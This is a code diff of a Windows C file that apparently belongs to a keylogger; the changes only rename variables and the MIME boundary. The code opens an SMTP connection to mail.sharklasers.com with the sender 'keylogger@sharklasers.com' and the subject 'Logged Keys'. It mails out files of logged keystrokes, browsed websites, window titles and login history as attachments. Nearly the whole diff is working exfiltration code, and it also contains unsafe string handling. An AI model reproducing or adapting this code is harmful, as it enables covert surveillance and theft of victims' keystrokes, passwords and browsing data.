@@ -16,41 +16,41 @@ using namespace std;
 
 int sendData(SOCKET* socket, const char* data)
 {
-    int iResult;
+    int res;
     printf("%s", data);
-    iResult = send(*socket, data, (int)strlen(data), 0);
-    if (iResult == SOCKET_ERROR) {
+    res = send(*socket, data, (int)strlen(data), 0);
+    if (res == SOCKET_ERROR) {
         printf("send failed (msg: %s): %d\n", data, WSAGetLastError());
     }
-    return iResult;
+    return res;
 }
 
 void recvData(SOCKET* socket)
 {
     int recvbuflen = DEFAULT_BUFLEN;
     char recvbuf[DEFAULT_BUFLEN];
-    int iResult;
-    iResult = recv(*socket, recvbuf, recvbuflen - 1, 0);
-    printf("In recvData function: %d\n", iResult);
-    if (iResult > 0) {
-        recvbuf[iResult] = '\0';
+    int res;
+    res = recv(*socket, recvbuf, recvbuflen - 1, 0);
+    printf("In recvData function: %d\n", res);
+    if (res > 0) {
+        recvbuf[res] = '\0';
         printf("%s", recvbuf);
     }
-    else if (iResult == 0)
+    else if (res == 0)
         printf("Connection closed\n");
     else
         printf("recv failed: %d\n", WSAGetLastError());
 }
 
 
-void sendTxtAttachment(SOCKET ConnectSocket, char *filename)
+void sendTxtAttachment(SOCKET Socket, char *filename)
 {
-    sendData(&ConnectSocket, "--977d81ff9d852ab2a0cad646f8058349\r\n");
-    sendData(&ConnectSocket, "Content-Type: text/plain\r\n");
+    sendData(&Socket, "--boundary\r\n");
+    sendData(&Socket, "Content-Type: text/plain\r\n");
     char filenameDisposition[100];
     sprintf(filenameDisposition, "Content-Disposition: attachment; filename=%s\r\n\r\n", filename);
-    sendData(&ConnectSocket, filenameDisposition);
-    sendData(&ConnectSocket, "U2FtcGxlIFRleHQu");
+    sendData(&Socket, filenameDisposition);
+    sendData(&Socket, "U2FtcGxlIFRleHQu");
 
     FILE* MailFilePtr = fopen(filename, "r");
     if (MailFilePtr == NULL)
@@ -65,7 +65,7 @@ void sendTxtAttachment(SOCKET ConnectSocket, char *filename)
         sprintf(buf, "%s", FileBuffer);
         buf[strlen(buf) - 1] = 0;
         strcat(buf,"\n");
-        sendData(&ConnectSocket, buf);
+        sendData(&Socket, buf);
         memset(FileBuffer, 0, sizeof(FileBuffer));
         memset(buf, 0, sizeof(buf));
     }
@@ -78,10 +78,10 @@ int mailMyLog(char *receiverAddress) {
 
     WSADATA wsaData;
 
-    int iResult;
-    iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
-    if (iResult != 0) {
-        printf("WSAStartup failed: %d\n", iResult);
+    int res;
+    res = WSAStartup(MAKEWORD(2, 2), &wsaData);
+    if (res != 0) {
+        printf("WSAStartup failed: %d\n", res);
         return 1;
     }
 
@@ -94,67 +94,67 @@ int mailMyLog(char *receiverAddress) {
     hints.ai_socktype = SOCK_STREAM;
     hints.ai_protocol = IPPROTO_TCP;
 
-    iResult = getaddrinfo("mail.sharklasers.com", SMTP_PORT, &hints, &result);
-    if (iResult != 0) {
-        printf("getaddrinfo failed: %d\n", iResult);
+    res = getaddrinfo("mail.sharklasers.com", SMTP_PORT, &hints, &result);
+    if (res != 0) {
+        printf("getaddrinfo failed: %d\n", res);
         WSACleanup();
         return 1;
     }
 
-    SOCKET ConnectSocket = INVALID_SOCKET;
+    SOCKET Socket = INVALID_SOCKET;
     for (ptr = result; ptr != NULL; ptr = ptr->ai_next) {
-        ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
-        if (ConnectSocket == INVALID_SOCKET) {
+        Socket = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
+        if (Socket == INVALID_SOCKET) {
             printf("socket failed: %ld\n", WSAGetLastError());
             WSACleanup();
             return 1;
         }
 
-        iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
-        if (iResult == SOCKET_ERROR) {
-            closesocket(ConnectSocket);
+        res = connect(Socket, ptr->ai_addr, (int)ptr->ai_addrlen);
+        if (res == SOCKET_ERROR) {
+            closesocket(Socket);
             printf("error detected\n");
-            ConnectSocket = INVALID_SOCKET;
+            Socket = INVALID_SOCKET;
             continue;
         }
         break;
     }
     freeaddrinfo(result);
 
-    if (ConnectSocket == INVALID_SOCKET) {
+    if (Socket == INVALID_SOCKET) {
         printf("Unable to connect to server!\n");
         printf(" %ld\n", WSAGetLastError());
         WSACleanup();
         return 1;
     }
 
-    sendData(&ConnectSocket, "HELO mail.sharklasers.com\r\n");
-    recvData(&ConnectSocket);
+    sendData(&Socket, "HELO mail.sharklasers.com\r\n");
+    recvData(&Socket);
     Sleep(1000);
-    sendData(&ConnectSocket, "MAIL FROM:<keylogger@sharklasers.com>\r\n");
-    recvData(&ConnectSocket);
+    sendData(&Socket, "MAIL FROM:<keylogger@sharklasers.com>\r\n");
+    recvData(&Socket);
     char line[1000];
     strcpy(line,"RCPT TO:<");
     strncat(line,receiverAddress,strlen(receiverAddress));
     strncat(line,">\r\n",3);
-    sendData(&ConnectSocket, line);
-    recvData(&ConnectSocket);
-    sendData(&ConnectSocket, "DATA\n");
-    recvData(&ConnectSocket);
-    sendData(&ConnectSocket, "Subject:Logged Keys\r\n");
-    sendData(&ConnectSocket, "And this is text\r\n");
-    sendData(&ConnectSocket, "MIME-Version: 1.0\r\n");
-    sendData(&ConnectSocket, "Content-Type:multipart/mixed;boundary=\"977d81ff9d852ab2a0cad646f8058349\"\r\n");
-    sendData(&ConnectSocket, "Subject:Logged Keys\r\n");
-    sendData(&ConnectSocket, "\r\n"); /* added */
-    sendData(&ConnectSocket, "--977d81ff9d852ab2a0cad646f8058349\r\n");
-    sendData(&ConnectSocket, "Content-Type: text/plain; charset=\"utf-8\"\r\n");
-    sendData(&ConnectSocket, "Content-Transfer-Encoding: quoted-printable\r\n\r\n");
+    sendData(&Socket, line);
+    recvData(&Socket);
+    sendData(&Socket, "DATA\n");
+    recvData(&Socket);
+    sendData(&Socket, "Subject:Logged Keys\r\n");
+    sendData(&Socket, "And this is text\r\n");
+    sendData(&Socket, "MIME-Version: 1.0\r\n");
+    sendData(&Socket, "Content-Type:multipart/mixed;boundary=\"boundary\"\r\n");
+    sendData(&Socket, "Subject:Logged Keys\r\n");
+    sendData(&Socket, "\r\n"); /* added */
+    sendData(&Socket, "--boundary\r\n");
+    sendData(&Socket, "Content-Type: text/plain; charset=\"utf-8\"\r\n");
+    sendData(&Socket, "Content-Transfer-Encoding: quoted-printable\r\n\r\n");
 
     char mylogs[10000];
     char tem[100];
     strcat(mylogs, "Hi Admin,=0A=0AHere are the logged keys and Prsed Data attached to the mail. And the recent login history are given below as text.=0A=0A");
-    sendData(&ConnectSocket, mylogs);
+    sendData(&Socket, mylogs);
 
     FILE *fp = fopen("login_history.txt", "r");
     while(fgets(tem,100,fp)!=NULL)
@@ -162,30 +162,30 @@ int mailMyLog(char *receiverAddress) {
         int size1= strlen(tem);
         tem[size1-1]='\n';
         tem[size1]='\0';
-        sendData(&ConnectSocket, tem);
+        sendData(&Socket, tem);
         strcat(mylogs, tem);
     }
-    sendData(&ConnectSocket,"=0A=0ARegards,=0A<SIAM>=0A=0A\r\n\r\n");
+    sendData(&Socket,"=0A=0ARegards,=0A<SIAM>=0A=0A\r\n\r\n");
 
-    sendTxtAttachment(ConnectSocket, "windows.txt");
-    sendTxtAttachment(ConnectSocket, "log.txt");
-    sendTxtAttachment(ConnectSocket, "browsed_websites.txt");
+    sendTxtAttachment(Socket, "windows.txt");
+    sendTxtAttachment(Socket, "log.txt");
+    sendTxtAttachment(Socket, "browsed_websites.txt");
 
-    sendData(&ConnectSocket, "\r\n\r\n--977d81ff9d852ab2a0cad646f8058349--\r\n\r\n");
-    sendData(&ConnectSocket, ".\r\n");
-    recvData(&ConnectSocket);
+    sendData(&Socket, "\r\n\r\n--boundary--\r\n\r\n");
+    sendData(&Socket, ".\r\n");
+    recvData(&Socket);
 
-    sendData(&ConnectSocket, "QUIT\r\n");
+    sendData(&Socket, "QUIT\r\n");
 
-    iResult = shutdown(ConnectSocket, SD_SEND);
-    if (iResult == SOCKET_ERROR) {
+    res = shutdown(Socket, SD_SEND);
+    if (res == SOCKET_ERROR) {
         printf("shutdown failed: %d\n", WSAGetLastError());
-        closesocket(ConnectSocket);
+        closesocket(Socket);
         WSACleanup();
         return 1;
     }
 
-    closesocket(ConnectSocket);
+    closesocket(Socket);
     WSACleanup();
     return 0;
 }
